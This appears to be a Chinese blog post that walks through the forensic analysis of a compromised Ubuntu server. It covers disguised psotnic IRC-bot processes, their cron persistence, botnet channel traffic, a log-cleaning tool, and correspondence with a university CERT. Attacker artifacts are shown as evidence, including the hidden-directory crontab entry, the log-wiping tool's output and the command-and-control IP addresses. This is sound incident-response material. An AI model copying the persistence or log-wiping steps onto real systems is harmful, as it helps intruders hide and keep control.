<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;crontab&nbsp;-l&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;*/10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf1&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li></ol></pre>




<p></p>




<p></p>




<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;cd&nbsp;/var/.x/psotnic;&nbsp;./smbd&nbsp;conf&nbsp;</span></span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[*]&nbsp;Acting&nbsp;as&nbsp;LEAF&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Config&nbsp;loaded&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Going&nbsp;into&nbsp;background&nbsp;[pid:&nbsp;5724]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:/var/.x/psotnic#&nbsp;./smbd&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Psotnic&nbsp;C++&nbsp;edition,&nbsp;version&nbsp;0.2.5-ipv6&nbsp;(Jul&nbsp;17&nbsp;2005&nbsp;20:39:49)&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2003-2005&nbsp;Grzegorz&nbsp;Rusin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[*]&nbsp;Acting&nbsp;as&nbsp;LEAF&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Config&nbsp;loaded&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;Going&nbsp;into&nbsp;background&nbsp;[pid:&nbsp;5727]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:/var/.x/psotnic#&nbsp;</span></li></ol></pre>




<p></p>




<p>用&rdquo;ps&rdquo;命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;ps&nbsp;axuw&nbsp;|&nbsp;grep&nbsp;smb&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3799&nbsp;&nbsp;0.0&nbsp;&nbsp;0.4&nbsp;&nbsp;8592&nbsp;2156&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11:00&nbsp;&nbsp;&nbsp;0:00&nbsp;/usr/sbin/smbd&nbsp;-D&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3808&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;8592&nbsp;&nbsp;896&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;11:00&nbsp;&nbsp;&nbsp;0:00&nbsp;/usr/sbin/smbd&nbsp;-D&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5724&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;1648&nbsp;&nbsp;772&nbsp;pts/2&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;12:47&nbsp;&nbsp;&nbsp;0:00&nbsp;./smbd&nbsp;conf&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5727&nbsp;&nbsp;0.0&nbsp;&nbsp;0.1&nbsp;&nbsp;1640&nbsp;&nbsp;764&nbsp;pts/2&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;12:47&nbsp;&nbsp;&nbsp;0:00&nbsp;./smbd&nbsp;conf1&nbsp;</span></li></ol></pre>




<p></p>




<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用&rdquo;strace&rdquo;命令来看看它做了什么：</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;strace&nbsp;-p&nbsp;5727&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;connect(3,&nbsp;{<span class="attribute">sa_family</span><span>=</span><span class="attribute-value">AF_INET</span><span>,&nbsp;</span><span class="attribute">sin_port</span><span>=</span><span class="attribute-value">htons</span><span>(9714),&nbsp;</span><span class="attribute">sin_addr</span><span>=</span><span class="attribute-value">inet_addr</span><span>(&quot;83.18.74.235&quot;)},&nbsp;16)&nbsp;=&nbsp;-1&nbsp;EINPROGRESS&nbsp;(Operation&nbsp;now&nbsp;in&nbsp;progress)&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;connect(4,&nbsp;{<span class="attribute">sa_family</span><span>=</span><span class="attribute-value">AF_INET</span><span>,&nbsp;</span><span class="attribute">sin_port</span><span>=</span><span class="attribute-value">htons</span><span>(6667),&nbsp;</span><span class="attribute">sin_addr</span><span>=</span><span class="attribute-value">inet_addr</span><span>(&quot;195.159.0.92&quot;)},&nbsp;16)&nbsp;=&nbsp;-1&nbsp;EINPROGRESS&nbsp;(Operation&nbsp;now&nbsp;in&nbsp;progress)&nbsp;</span></span></li></ol></pre>




<p></p>




<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;83.18.74.235&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;manhattan.na.pl.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;195.159.0.92&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;ircnet.irc.powertech.no.&nbsp;</span></li></ol></pre>




<p></p>




<p>又是一个波兰的ip.另外一个ip,&rdquo;ircnet.irc.powertech.no&rdquo;是&rdquo;irc.powertech.nof&rdquo;的别名.是挪威一个著名的irc服务器。</p>




<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了&rdquo;irc.powertech.no&rdquo;,加入了&rdquo;#aik&rdquo;频道。</p>




<p></p>




<p id="highlighter_465610">&nbsp;</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>:irc.powertech.no&nbsp;001&nbsp;578PAB9NB&nbsp;:Welcome&nbsp;to&nbsp;the&nbsp;Internet&nbsp;Relay&nbsp;Network&nbsp;578PAB9NB!~op@ti231210a080-3666.bb.online.no&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;002&nbsp;578PAB9NB&nbsp;:Your&nbsp;host&nbsp;is&nbsp;irc.powertech.no,&nbsp;running&nbsp;version&nbsp;2.11.1p1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:578PAB9NB!~op@ti231210a080-3666.bb.online.no&nbsp;JOIN&nbsp;:#aik&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;353&nbsp;578PAB9NB&nbsp;@&nbsp;#aik&nbsp;:578PAB9NB&nbsp;kknd&nbsp;raider&nbsp;brandyz&nbsp;jpi&nbsp;conf&nbsp;xerkoz&nbsp;IpaL&nbsp;vvo&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;366&nbsp;578PAB9NB&nbsp;#aik&nbsp;:End&nbsp;of&nbsp;NAMES&nbsp;list.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~op&nbsp;ti231210a080-3666.bb.online.no&nbsp;irc.powertech.no&nbsp;578PAB9NB&nbsp;G&nbsp;:0&nbsp;op&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~kknd&nbsp;ti231210a080-3666.bb.online.no&nbsp;irc.hitos.no&nbsp;kknd&nbsp;H&nbsp;:2&nbsp;kknd&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~raider&nbsp;mobitech-70.max-bc.spb.ru&nbsp;*.dotsrc.org&nbsp;raider&nbsp;G&nbsp;:4&nbsp;raider&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~brandyz&nbsp;mobitech-70.max-bc.spb.ru&nbsp;*.dotsrc.org&nbsp;brandyz&nbsp;G&nbsp;:4&nbsp;brandyz&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~jpi&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;jpi&nbsp;G&nbsp;:8&nbsp;jpi&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~conf&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;conf&nbsp;G&nbsp;:7&nbsp;conf&nbsp;-&nbsp;GTW&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~xerkoz&nbsp;p3124-ipad309sasajima.aichi.ocn.ne.jp&nbsp;*.jp&nbsp;xerkoz&nbsp;H&nbsp;:7&nbsp;xerkoz&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;lm&nbsp;campus19.panorama.sth.ac.at&nbsp;*.at&nbsp;IpaL&nbsp;H&nbsp;:5&nbsp;.LaPi.9@.IRCNet..&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;352&nbsp;578PAB9NB&nbsp;#aik&nbsp;~vvo&nbsp;ppp86-7.intelcom.sm&nbsp;*.tiscali.it&nbsp;vvo&nbsp;H&nbsp;:6&nbsp;vvo&nbsp;-&nbsp;GTW&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;:irc.powertech.no&nbsp;315&nbsp;578PAB9NB&nbsp;#aik&nbsp;:End&nbsp;of&nbsp;WHO&nbsp;list.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>这些仅仅是加入#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;viper42&nbsp;[~viper42@trinity.gnist.org]&nbsp;has&nbsp;joined&nbsp;#aik&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[Users&nbsp;#aik]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[&nbsp;578PAB9NL]&nbsp;[&nbsp;conf]&nbsp;[&nbsp;jpi&nbsp;]&nbsp;[&nbsp;raider&nbsp;]&nbsp;[&nbsp;vvo&nbsp;&nbsp;&nbsp;]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;[&nbsp;brandyz&nbsp;&nbsp;]&nbsp;[&nbsp;IpaL]&nbsp;[&nbsp;kknd]&nbsp;[&nbsp;viper42]&nbsp;[&nbsp;xerkoz]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;Irssi:&nbsp;#aik:&nbsp;Total&nbsp;of&nbsp;10&nbsp;nicks&nbsp;[0&nbsp;ops,&nbsp;0&nbsp;halfops,&nbsp;0&nbsp;voices,&nbsp;10&nbsp;normal]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;17:43&nbsp;-!-&nbsp;Irssi:&nbsp;Join&nbsp;to&nbsp;#aik&nbsp;was&nbsp;synced&nbsp;in&nbsp;1&nbsp;secs&nbsp;</span></li></ol></pre>




<p></p>




<p></p>




<p>我发现我朋友的服务器使用的昵称是&rdquo;578PQB9NB&rdquo;,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀&rdquo;\*-GTW&rdquo;,只有一个没有：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;IpaL&nbsp;[lm@campus19.panorama.sth.ac.at]&nbsp;</span></span></li><li><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;ircname&nbsp;&nbsp;:&nbsp;LaPi@IRCNet&nbsp;</span></li><li class="alt"><span>17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;channels&nbsp;:&nbsp;#relaks&nbsp;#ping&nbsp;@#seks&nbsp;#aik&nbsp;@#ogame.pl&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#pingwinaria&nbsp;#hattrick&nbsp;#trade&nbsp;#admin&nbsp;@#!sh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;17:45&nbsp;[powertech]&nbsp;-!-&nbsp;&nbsp;server&nbsp;&nbsp;&nbsp;:&nbsp;*.at&nbsp;[\o\&nbsp;&nbsp;\o/&nbsp;&nbsp;/o/]&nbsp;</span></li></ol></pre>




<p></p>




<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>$&nbsp;dig&nbsp;+short&nbsp;campus19.panorama.sth.ac.at&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;193.170.51.84&nbsp;</span></li></ol></pre>




<p></p>




<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:</p>




<p></p>




<p id="highlighter_156327">

<table border="0" cellpadding="0" cellspacing="0">

    <tbody>

        <tr>

            <td>

            <pre><ol class="dp-xml"><li class="alt"><span><span>From:&nbsp;Alexander&nbsp;Talos&nbsp;via&nbsp;RT&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;To:&nbsp;larstra@ifi.uio.no&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Subject:&nbsp;Cracker&nbsp;at&nbsp;campus19.panorama.sth.ac.at&nbsp;(193.170.51.84)&nbsp;&nbsp;[ACOnet&nbsp;CERT&nbsp;#38603]&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Date:&nbsp;Fri,&nbsp;18&nbsp;May&nbsp;2007&nbsp;18:22:43&nbsp;+0200&nbsp;(CEST)&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Reply-To:&nbsp;cert@aco.net&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;-----BEGIN&nbsp;PGP&nbsp;SIGNED&nbsp;MESSAGE-----&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Hash:&nbsp;SHA1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Hej!&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;On&nbsp;Fri&nbsp;May&nbsp;18&nbsp;14:45:03&nbsp;2007,&nbsp;larstra@ifi.uio.no&nbsp;wrote:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;I&nbsp;have&nbsp;been&nbsp;tracking&nbsp;down&nbsp;cracker&nbsp;which&nbsp;connected&nbsp;from&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;campus19.panorama.sth.ac.at&nbsp;(193.170.51.84).&nbsp;The&nbsp;user,&nbsp;which&nbsp;</span></span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Ouch.&nbsp;panorama.sth.ac.at&nbsp;is&nbsp;a&nbsp;dormitory&nbsp;with&nbsp;about&nbsp;4k&nbsp;rooms&nbsp;all&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;behind&nbsp;a&nbsp;NAT&nbsp;gateway&nbsp;-&nbsp;it&nbsp;will&nbsp;be&nbsp;very&nbsp;hard&nbsp;to&nbsp;get&nbsp;hold&nbsp;of&nbsp;the&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;miscreant.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;This&nbsp;incident&nbsp;will,&nbsp;in&nbsp;the&nbsp;long&nbsp;run,&nbsp;definitely&nbsp;help&nbsp;me&nbsp;getting&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;rid&nbsp;of&nbsp;the&nbsp;NAT&nbsp;boxes&nbsp;in&nbsp;setups&nbsp;like&nbsp;that,&nbsp;but&nbsp;right&nbsp;now,&nbsp;we&nbsp;will&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;have&nbsp;to&nbsp;make&nbsp;do&nbsp;with&nbsp;what&nbsp;we&nbsp;have.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;Please&nbsp;investigate&nbsp;the&nbsp;host&nbsp;in&nbsp;question.&nbsp;Perhaps&nbsp;is&nbsp;this&nbsp;a&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;<span class="tag">&gt;</span><span>&nbsp;compromised&nbsp;host&nbsp;on&nbsp;your&nbsp;network&nbsp;acting&nbsp;as&nbsp;a&nbsp;jumpstation&nbsp;for&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Sure,&nbsp;and&nbsp;even&nbsp;in&nbsp;a&nbsp;NATed&nbsp;environment,&nbsp;this&nbsp;is&nbsp;still&nbsp;possible.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;Btw,&nbsp;you&nbsp;did&nbsp;a&nbsp;great&nbsp;job&nbsp;in&nbsp;analysing&nbsp;the&nbsp;compromised&nbsp;machine!&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;I'll&nbsp;let&nbsp;you&nbsp;know&nbsp;when&nbsp;I&nbsp;have&nbsp;either&nbsp;further&nbsp;questions&nbsp;or&nbsp;any&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;interesting&nbsp;results.&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Cheers,&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;Alexander&nbsp;Talos&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;-&nbsp;--&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;IT-Security,&nbsp;Universitaet&nbsp;Wien,&nbsp;ACOnet&nbsp;CERT&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;T:&nbsp;+43-1-4277-14351&nbsp;&nbsp;M:&nbsp;+43-664-60277-14351&nbsp;</span></li></ol></pre>

            </td>

            <td>&nbsp;</td>

        </tr>

    </tbody>

</table>

</p>




<p></p>




<p>看起来我不够幸运。</p>




<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口。</p>




<p>连接到&rdquo;83.18.74.235&Prime;的流量看起来很混乱.只好再次用strace命令：</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x/psotnic#&nbsp;strace&nbsp;-f&nbsp;./smbd&nbsp;conf1&nbsp;&amp;</span><span class="tag">&gt;</span><span>&nbsp;/root/dump.strace&nbsp;</span></span></li></ol></pre>




<p></p>




<p>跟预期的一样,有很多输出,其中一个是它尝试启动&rdquo;BitchX&rdquo;,这是一个irc客户端.但是失败了,因为BitchX没有安装：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;sh:&nbsp;&quot;,&nbsp;4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;4&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;BitchX:&nbsp;not&nbsp;found&quot;,&nbsp;17)&nbsp;=&nbsp;17&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;write(2,&nbsp;&quot;n&quot;,&nbsp;1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[pid&nbsp;&nbsp;7537]&nbsp;close(2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0&nbsp;</span></li></ol></pre>




<p></p>




<p>下面的截图是tcpdump抓到流量的一部分：</p>




<p style="text-align: center;"><a href="http://s1.51cto.com/wyfs01/M01/1E/83/wKioJlIyccSSRa_0AAGpmBBA9v0021.jpg" rel="lightbox[47824]" title="一次服务器被入侵后的分析"><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;&#8217; onmousewheel = &#8216;javascript:return big(this)&#8217; alt=&#8221;rq3&#8221; src=&#8221;http://s1.51cto.com/wyfs01/M01/1E/83/wKioJlIyccSSRa_0AAGpmBBA9v0021.jpg&#8221; /></a></p>




<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是&rdquo;irc.hitos.no&rdquo;,位于挪威的特罗姆斯郡。</p>




<p>入侵者除了这些,还运行了一个叫&rdquo;hide&rdquo;的脚本来清除日志：</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/usr/lib/libsh#&nbsp;./hide&nbsp;+&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Linux&nbsp;Hider&nbsp;v2.0&nbsp;by&nbsp;mave&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;enhanced&nbsp;by&nbsp;me!&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;[Shkupi&nbsp;Logcleaner]&nbsp;Removing&nbsp;+&nbsp;from&nbsp;the&nbsp;logs........&nbsp;.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/messages&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/run/utmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/lastlog&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;[+]&nbsp;/var/log/wtmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;[done]&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;*&nbsp;m&nbsp;i&nbsp;s&nbsp;s&nbsp;i&nbsp;o&nbsp;n&nbsp;&nbsp;a&nbsp;c&nbsp;c&nbsp;o&nbsp;m&nbsp;p&nbsp;l&nbsp;i&nbsp;s&nbsp;h&nbsp;e&nbsp;d&nbsp;*&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;p.h.e.e.r&nbsp;&nbsp;S.H.c.r.e.w&nbsp;</span></li></ol></pre>




<p></p>




<p>那么这个入侵者为什么还要把&rdquo;/var/log/&rdquo;目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>




<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到：</p>




<p>1、忘记清除&rdquo;.bash_history&rdquo;文件</p>




<p>2、&ldquo;/var/log&rdquo;目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>




<p>3、修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>




<p>4、irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>




<p>5、入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>




<p>当然还有几个遗留的问题：</p>




<p>1、&rdquo;ssh ftp@62.101.251.166&Prime; 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>$&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;62.101.251.166&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cA6FB653E.dhcp.bluecom.no.&nbsp;</span></li></ol></pre>




<p></p>




<p>2、跟83.18.74.235(manhattan.na.pl)的通讯内容是什么？</p>




<p>3、最重要的问题是他一开始是如何或得下系统的权限的？这个服务器运行的是Ubuntu 6.06 LTS，打了最新的补丁。可能入侵的途径：</p>




<p>*猜测root密码,不幸的是这个密码是强密码*</p>




<p>*未知的exploit*</p>




<p>*某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码.*</p>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nss及它与PAM的关系]]></title>
    <link href="http://archulate.github.io/blog/2013/08/03/nss/"/>
    <updated>2013-08-03T18:18:17+08:00</updated>
    <id>http://archulate.github.io/blog/2013/08/03/nss</id>
    <content type="html"><![CDATA[<!--more-->


